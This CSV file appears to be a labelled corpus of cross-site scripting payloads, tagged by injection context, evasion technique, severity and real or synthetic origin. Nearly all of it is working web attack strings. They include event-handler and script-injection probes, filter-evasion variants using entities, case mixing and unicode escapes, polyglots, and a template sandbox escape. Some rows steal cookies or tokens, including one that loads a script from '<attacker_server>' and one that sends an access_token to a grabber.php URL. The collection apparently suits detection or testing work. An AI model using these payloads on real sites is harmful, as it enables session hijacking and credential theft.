payload,context,technique,severity,length,source
<article onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,69,real
"<td draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</td>",event_handler,none,medium,62,real
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",script_injection,none,low,83,real
<input3 onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(5896)"">DEF",js_uri,none,medium,67,real
""" oNmoUseOveR=pRomPt(LocAtiOn.HasH) """,attribute_escape,synthetic,medium,37,synthetic
e.g: 14.rs/#alert(document.domain),dom_sink,none,medium,34,real
"<legend draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",event_handler,none,medium,85,real
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//,event_handler,none,low,61,real
<svg><a onload=alert(1)></a>,event_handler,none,medium,28,real
<svg onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,61,synthetic
<big onpointerup=alert(1) style=display:block>AnonKryptiQuz</big>,event_handler,none,medium,65,real
"<rtc onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rtc>",event_handler,none,medium,81,real
%3Cscript%3E/*/prompt(1)%3C/script%3E,script_injection,synthetic,medium,37,synthetic
<head onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</head><input value=clickme>,event_handler,none,medium,108,real
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(/AmoloHT/)>"">",tag_injection,html_entity,medium,69,real
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationstart=""alert(1)""></picture>",event_handler,none,medium,101,real
<fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>,event_handler,none,medium,74,real
""" onfocus=confirm(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape,synthetic,medium,60,synthetic
<head onpointerout=alert(1) style=display:block>AnonKryptiQuz</head>,event_handler,none,medium,68,real
"""><svg onerror=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,57,synthetic
"""><svg onb&#101;gin=confirm('XSS')>",tag_injection,synthetic,medium,35,synthetic
<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>,event_handler,none,medium,69,real
"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",script_injection,none,medium,52,real
"<hr onclick=""alert(1)"">AnonKryptiQuz</hr>",event_handler,none,medium,41,real
"<IMG SRC=""livescript:[code]"">",tag_injection,case_variation,low,29,real
"<spacer onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",event_handler,none,medium,74,real
"<style>:target {color:red;}</style><kbd id=x style=""transition:color 1s"" ontransitionend=alert(1)></kbd>",event_handler,none,medium,104,real
"<style>@keyframes x{}</style><image2 style=""animation-name:x"" onanimationstart=""alert(1)""></image2>",event_handler,none,medium,99,real
"""><svg onlo&#97;d=prompt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,48,synthetic
"<style>:target {color: red;}</style><dfn id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dfn>",event_handler,none,medium,109,real
<hgroup onblur=alert(1) tabindex=1 id=x></hgroup><input autofocus>,event_handler,none,medium,66,real
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></head>",event_handler,none,medium,112,real
<svg ontoggl&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,50,synthetic
<svG oNbeGin=prOmpT(dOcuMenT.cOokIe)/>,tag_injection,synthetic,medium,38,synthetic
"<input onblur=""alert('AnonKryptiQuz')"" value=""Blur me"">",event_handler,none,medium,55,real
"<shadow oncontextmenu=""alert(1)"">AnonKryptiQuz</shadow>",event_handler,none,medium,55,real
"""><svg onload=confirm(1)>",tag_injection,synthetic,medium,25,synthetic
"<style>@keyframes slidein {}</style><animate style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></animate>",event_handler,none,medium,168,real
"<script src=""\\%(jscript)s""></script>",script_injection,none,low,37,real
"<style>:target {color:red;}</style><s id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></s>",event_handler,none,medium,106,real
"' onfocus=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,50,synthetic
"<script src=""data:text/javascript,alert(9252)""></script>",script_injection,none,medium,56,real
"<colgroup draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",event_handler,none,medium,92,real
"<style>@keyframes x{}</style><img style=""animation-name:x"" onwebkitanimationend=""alert(1)""></img>",event_handler,none,medium,97,real
"<meta http-equiv=""refresh"" content="" ; url=javascript:alert('AnonKryptiQuz');"">",event_handler,none,medium,79,real
"<listing onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",event_handler,none,medium,75,real
"%3Cscript%3Econfirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,medium,63,synthetic
"""><svg onb&#101;gin=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,77,synthetic
"&lt;IMG SRC=\""mocha&#58;&#91;code&#93;\""&gt;",generic,html_entity,low,44,real
"<kbd onmouseout=""alert(1)"">AnonKryptiQuz</kbd>",event_handler,none,medium,46,real
<svg><dd onload=alert(1)></dd>,event_handler,none,medium,30,real
<dir onpointermove=alert(1) style=display:block>AnonKryptiQuz</dir>,event_handler,none,medium,67,real
"<abbr draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</abbr>",event_handler,none,medium,66,real
<button popovertarget=x>Click me</button><multicol ontoggle=alert(1) popover id=x>AnonKryptiQuz</multicol>,event_handler,none,medium,106,real
<noembed onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</noembed>,event_handler,none,medium,80,real
"<style>:target {color: red;}</style><track id=x style=""transition:color 10s"" ontransitioncancel=print()></track>",event_handler,none,low,112,real
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",script_injection,unicode_escape|url_encoding,low,99,real
"<option onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</option>",event_handler,none,medium,68,real
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #,event_handler,none,high,115,real
"<scr	ipt>//alert(String.fromCharCode(88,83,83))</scr	ipt>",script_injection,synthetic,medium,57,synthetic
"<FRAMESET><FRAME SRC=""javascript:document.vulnerable=true;""></frameset>",js_uri,case_variation,low,71,real
<svg onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,66,synthetic
"<datalist ondblclick=""alert(1)"">AnonKryptiQuz</datalist>",event_handler,none,medium,56,real
"<img src=a onerror=""var x=document.createElement('script');x.src='<attacker_server>/api.js';document.body.appendChild(x);"">",event_handler,none,high,123,real
"""`'><script>\x0Cjavascript:alert(1)</script>",script_injection,none,medium,44,real
"<article draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</article>",event_handler,none,medium,72,real
%22 onload=confirm(location.hash) %22,attribute_escape,synthetic,medium,37,synthetic
%22><svg onerror=alert(%27XSS%27)>,tag_injection,synthetic,medium,34,synthetic
"<element ondblclick=""alert(1)"">AnonKryptiQuz</element>",event_handler,none,medium,54,real
"<br draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</br>",event_handler,none,medium,77,real
"' onb&#101;gin=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,63,synthetic
"<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",js_uri,none,low,61,real
<sc%00ript/AnonKryptiQuz='asdf'>alert/**/(1)</script>,event_handler,comment_injection|url_encoding,low,53,real
<svg onbegin=confirm(%27XSS%27)/>,tag_injection,synthetic,medium,33,synthetic
<svG oNmoUseOveR=cOnfIrm(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,42,synthetic
<svg ontoggl&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,53,synthetic
"<multicol onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",event_handler,none,medium,78,real
"%22 ontoggle=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,55,synthetic
"<kbd onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,67,real
<u onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</u><input value=clickme>,event_handler,none,medium,93,real
"javascript:\u0061lert(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,52,synthetic
"<link oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,98,real
"' ontoggle=console.log(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,55,synthetic
"<style>@keyframes slidein {}</style><fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></fieldset>",event_handler,none,medium,176,real
"<rp onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rp>",event_handler,none,medium,79,real
"<style>@keyframes x{}</style><image2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></image2>",event_handler,none,medium,103,real
<marquee onstart=alert(1)>,event_handler,none,medium,26,real
"avascript:/*""/*'/*\""/*`/*><frame src=javascript:alert()></template </textarea </title </style </noscript </noembed </script --><<script>alert()<</script>\ /**/alert()//",script_injection,comment_injection,medium,168,real
%22><svg onmouseover=console.log(location.hash)>,tag_injection,synthetic,medium,48,synthetic
%3Csvg onmouseenter=confirm(1)%3E,tag_injection,synthetic,medium,33,synthetic
<bdo onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
<svg onmouseover=prompt(document.cookie)/>,tag_injection,synthetic,medium,42,synthetic
"<style>:target {color: red;}</style><template id=x style=""transition:color 10s"" ontransitioncancel=print()></template>",event_handler,none,low,118,real
<svg on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,63,synthetic
<b onpointerover=alert(1) style=display:block>AnonKryptiQuz</b>,event_handler,none,medium,63,real
"<ol oncut=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",event_handler,none,medium,55,real
"<style>:target {color: red;}</style><rp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rp>",event_handler,none,medium,107,real
"""><img src:x onerror=prompt(document.domain);>",event_handler,none,medium,46,real
"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>",script_injection,url_encoding,high,281,real
<video onloadstart=alert(1)><source>,event_handler,none,medium,36,real
"<section draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,67,real
<b <script>alert(1)</script>0,script_injection,none,medium,29,real
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,event_handler,none,medium,60,real
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable style=display:block>drop here</meta>",event_handler,none,medium,129,real
"<sup onmouseover=""alert(1)"">AnonKryptiQuz</sup>",event_handler,none,medium,47,real
"""><img src=x onerror=alert(1);>",event_handler,none,medium,31,real
"""%3E%3Csvg onmouseover=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,62,synthetic
<keygen autofocus onfocus=alert(1)>,event_handler,none,medium,35,real
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable style=display:block>drop here</colgroup>",event_handler,none,medium,137,real
<meter onpointerenter=alert(1) style=display:block>AnonKryptiQuz</meter>,event_handler,none,medium,72,real
' onerror=console.log(location.hash) ',attribute_escape,synthetic,medium,38,synthetic
"<kbd ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,87,real
"<strong onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</strong>",event_handler,none,medium,73,real
""" onerror=prompt(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,49,synthetic
<body contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
"<footer draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</footer>",event_handler,none,medium,65,real
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>,script_injection,none,low,109,real
"javascript:alert/*`/*\/*'/*\""/*""/**/(alert())// alert()//--></template><frame/onload=alert() <img src=x onerror=alert()></style/</title/</textarea/</noscript/</noembed/</script><script>alert()</script>",script_injection,comment_injection,medium,201,real
<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,118,real
"<div ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</div>",event_handler,none,medium,87,real
"<del onmousemove=""alert(1)"">AnonKryptiQuz</del>",event_handler,none,medium,47,real
"<picture onmousemove=""alert(1)"">AnonKryptiQuz</picture>",event_handler,none,medium,55,real
A” autofocus onfocus=alert(“XSS”)//,event_handler,none,medium,35,real
<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>,event_handler,none,medium,57,real
"<script ondblclick=""alert(1)"">AnonKryptiQuz</script>",script_injection,none,medium,52,real
"<kbd oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
"<slot onmousemove=""alert(1)"">AnonKryptiQuz</slot>",event_handler,none,medium,49,real
<script><script>alert(1)</script>,script_injection,none,medium,33,real
<ins onpointerover=alert(1) style=display:block>AnonKryptiQuz</ins>,event_handler,none,medium,67,real
"<style>:target {color: red;}</style><br id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></br>",event_handler,none,medium,107,real
"<style>:target {transform: rotate(180deg);}</style><meter id=x style=""transition:transform 2s"" ontransitionrun=print()></meter>",event_handler,none,low,127,real
"<animate onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</animate>",event_handler,none,medium,76,real
<input onblur=write(AnonKryptiQuz) autofocus><input autofocus>,event_handler,none,low,62,real
<button popovertarget=x>Click me</button><frame onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</frame>,event_handler,none,medium,106,real
"xss&#58;ex&#x2F;*AnonKryptiQuz*//*/*/pression(alert(\""AnonKryptiQuz\""))'&gt;",generic,html_entity|comment_injection,medium,76,real
"<style>:target {color: red;}</style><image2 id=x style=""transition:color 10s"" ontransitioncancel=print()></image2>",event_handler,none,low,114,real
"<dialog ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</dialog>",event_handler,none,medium,93,real
"'`""><\x3Cscript>javascript:alert(6149)</script>",js_uri,none,medium,47,real
"<menu onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</menu>",event_handler,none,medium,66,real
"<link onmouseenter=""alert(1)"">AnonKryptiQuz</link>",event_handler,none,medium,50,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></source>",event_handler,none,medium,182,real
"<style>@keyframes slidein {}</style><tbody style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tbody>",event_handler,none,medium,164,real
"""><svg onmouseenter=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,58,synthetic
"<script draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,90,real
"{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",template_injection,none,medium,122,real
"""><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>",script_injection,url_encoding,low,107,real
"""><svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,90,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></section>",event_handler,none,medium,184,real
<iframe onpointerout=alert(1) style=display:block>AnonKryptiQuz</iframe>,event_handler,none,medium,72,real
"%3Cscript%3E/*/console.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,medium,70,synthetic
"""%3E%3Csvg onmouseenter=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,69,synthetic
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,script_injection,none,low,60,real
<imG oNloAd=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,33,synthetic
""">'><details/open/ontoggle=confirm('AnonKryptiQuz')>",event_handler,none,medium,52,real
<scRipT>aLerT`'XSS'`</scRipT>,script_injection,synthetic,medium,29,synthetic
"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>",event_handler,none,medium,107,real
<br id=x tabindex=1 onactivate=alert(1)></br>,event_handler,none,medium,45,real
"<style>@keyframes slidein {}</style><set style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></set>",event_handler,none,medium,166,real
<script>/*/console.log(%27XSS%27)</script>,script_injection,synthetic,medium,42,synthetic
"<style>@keyframes x{}</style><input4 style=""animation-name:x"" onanimationend=""alert(1)""></input4>",event_handler,none,medium,97,real
"<mark draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</mark>",event_handler,none,medium,61,real
<fieldset id=x tabindex=1 onbeforedeactivate=alert(1)></fieldset><input autofocus>,event_handler,none,medium,82,real
<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>,event_handler,none,medium,70,real
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",event_handler,none,medium,84,real
"<strong onmousemove=""alert(1)"">AnonKryptiQuz</strong>",event_handler,none,medium,53,real
"""><img src=x onerror=prompt(document['domain']);>",event_handler,none,medium,49,real
"<style>@keyframes x{}</style><a2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></a2>",event_handler,none,medium,95,real
<svg onbegin=alert('XSS')>,tag_injection,synthetic,medium,26,synthetic
"<html draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</html>",event_handler,none,medium,86,real
"<IFRAME SRC='f' onerror=""alert(1)""></IFRAME>",event_handler,case_variation,medium,44,real
<svg onfocus=confirm(location.hash)>,tag_injection,synthetic,medium,36,synthetic
<scRipT>pRomPt`DocUmeNt.DomAin`</ScrIpt>,script_injection,synthetic,medium,40,synthetic
"""`'><script>\xE2\x80\x8Ajavascript:alert(6406)</script>",script_injection,none,medium,55,real
' oNfoCus=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,40,synthetic
"<hgroup onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</hgroup>",event_handler,none,medium,85,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tt>",event_handler,none,medium,174,real
<input autofocus onblur=alert(1)>,event_handler,none,medium,33,real
<del onpointerup=alert(1) style=display:block>AnonKryptiQuz</del>,event_handler,none,medium,65,real
<scRipT>aLerT`dOcuMenT.dOmaIn`</sCriPt>,script_injection,synthetic,medium,39,synthetic
<listing onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</listing><input value=clickme>,event_handler,none,medium,105,real
"<iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(125)""></iframe>",js_uri,none,medium,82,real
<script>a=/XSS/\ndocument.vulnerable=true;</script>,script_injection,none,low,51,real
<svgonload=alert(1)>,event_handler,none,medium,24,real
"<IMG SRC=x ondragenter=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,62,real
' onerror=confirm(1) ',attribute_escape,synthetic,medium,22,synthetic
<<SCRIPT>alert(1)//<</SCRIPT>,script_injection,case_variation,medium,29,real
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,generic,html_entity,medium,44,real
<link onreadystatechange=alert(1) rel=stylesheet href=1>,event_handler,none,medium,56,real
"<style>:target {transform: rotate(180deg);}</style><option id=x style=""transition:transform 2s"" ontransitionrun=print()></option>",event_handler,none,low,129,real
<script>/*/consol&#101;.log(loc&#97;tion.h&#97;sh)</script>,script_injection,synthetic,medium,59,synthetic
"<style>:target {color:red;}</style><set id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></set>",event_handler,none,medium,110,real
<caption onpointermove=alert(1) style=display:block>AnonKryptiQuz</caption>,event_handler,none,medium,75,real
<svg onload=\u0061lert(location.hash)/>,tag_injection,synthetic,medium,39,synthetic
"<col ondblclick=""alert(1)"">AnonKryptiQuz</col>",event_handler,none,medium,46,real
"<data oncontextmenu=""alert(1)"">AnonKryptiQuz</data>",event_handler,none,medium,51,real
<strong onpointerout=alert(1) style=display:block>AnonKryptiQuz</strong>,event_handler,none,medium,72,real
"<hgroup oncut=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",event_handler,none,medium,63,real
%22><svg onload=confirm(%27XSS%27)>,tag_injection,synthetic,medium,35,synthetic
"s = '""><script>alert(1)</script>' print 'eval(String.fromCharCode('+"","".join([str(ord(o)) for o in s])+'))'",script_injection,encoding,high,107,real
<script>/*/confirm(docum&#101;nt.cooki&#101;)</script>,script_injection,synthetic,medium,54,synthetic
"<xmp draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</xmp>",event_handler,none,medium,64,real
"='><script>alert(""xss"")</script>",script_injection,none,medium,32,real
"<basefont draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</basefont>",event_handler,none,medium,74,real
"<fieldset onmousemove=""alert(1)"">AnonKryptiQuz</fieldset>",event_handler,none,medium,57,real
"<header onclick=""alert(1)"">AnonKryptiQuz</header>",event_handler,none,medium,49,real
"<style>:target {color:red;}</style><base id=x style=""transition:color 1s"" ontransitionend=alert(1)></base>",event_handler,none,medium,106,real
<foreignObject><script>alert('svg foreignObject')</script></foreignObject>,script_injection,case_variation,medium,74,real
"<kbd draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,82,real
"<input4 onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</input4>",event_handler,none,medium,87,real
";\\""))}catch(e) {confirm(document.location);}//",dom_sink,none,medium,47,real
<svg onclick=alert('XSS')>,tag_injection,synthetic,medium,26,synthetic
"<picture onclick=""alert(1)"">AnonKryptiQuz</picture>",event_handler,none,medium,51,real
"s&#101;tTim&#101;out(""consol&#101;.log(docum&#101;nt.cooki&#101;)"",0)",dom_sink,synthetic,medium,69,synthetic
<nav onpointerenter=alert(1) style=display:block>AnonKryptiQuz</nav>,event_handler,none,medium,68,real
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",event_handler,unicode_escape|html_entity|url_encoding,low,75,real
"<svg onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,65,real
"<DIV STYLE=""background-image: url(&#1;javascript:alert('AnonKryptiQuz'))"">",js_uri,html_entity|case_variation,medium,74,real
<script>+-+-1-+-+confirm(1)</script>,script_injection,none,medium,36,real
"<spacer oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<noembed draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,92,real
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationstart=""alert(1)""></applet>",event_handler,none,medium,99,real
<map onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
'te' < alert('<') < 'xt';,generic,none,medium,25,real
<input onauxclick=alert(1)>,event_handler,none,medium,27,real
"<DIV STYLE=""background-image: url(&#1;javascript:alert(6481))"">",js_uri,html_entity|case_variation,medium,63,real
"<address onmouseup=""alert(1)"">AnonKryptiQuz</address>",event_handler,none,medium,53,real
<[%00]img onerror=alert(1) src=a>,event_handler,url_encoding,medium,33,real
"<meta name=""referrer"" content=""no-referrer"">",attribute,event_handler,medium,44,real
<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>,event_handler,none,medium,78,real
"<style>@keyframes x{}</style><input3 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></input3>",event_handler,none,medium,103,real
"<IMG SRC=x onratechange=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,63,real
"<style>:target {transform: rotate(180deg);}</style><animatetransform id=x style=""transition:transform 2s"" ontransitionrun=print()></animatetransform>",event_handler,none,low,149,real
"<tbody onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</tbody>",event_handler,none,medium,68,real
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=print()></details>",event_handler,none,low,116,real
<legend onpointerenter=alert(1) style=display:block>AnonKryptiQuz</legend>,event_handler,none,medium,74,real
<img onlo&#97;d=prompt('XSS')/>,tag_injection,synthetic,medium,31,synthetic
"<a href=""javascript://%0aalert(1)"">XSS</a>",generic,obfuscation,medium,42,real
<nobr onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</nobr>,event_handler,none,medium,74,real
"<meter draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</meter>",event_handler,none,medium,68,real
{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}},event_handler,unicode_escape,medium,56,real
"<noembed onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</noembed>",event_handler,none,medium,73,real
"<head draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</head>",event_handler,none,medium,85,real
"<style>:target {transform: rotate(180deg);}</style><th id=x style=""transition:transform 2s"" ontransitionrun=print()></th>",event_handler,none,low,121,real
"<style>@keyframes slidein {}</style><rb style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></rb>",event_handler,none,medium,164,real
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,event_handler,none,medium,64,real
"<textarea oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,101,real
"""'><img src=xxx:x \x22onerror=javascript:alert(6701)>",event_handler,none,medium,53,real
"<a href=""javas	cript:alert(1)"">XSS</a>",js_uri,tag_injection,medium,38,real
<q contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,55,real
"<figure onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</figure>",event_handler,none,medium,85,real
"""><Svg onCliCk=ConFirM('XSS')>",tag_injection,synthetic,medium,30,synthetic
%3Csvg onload=prompt(document.domain)/%3E,tag_injection,synthetic,medium,41,synthetic
<svg onlo&#97;d=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,46,synthetic
%3Csvg ontoggle=confirm(document.cookie)%3E,tag_injection,synthetic,medium,43,synthetic
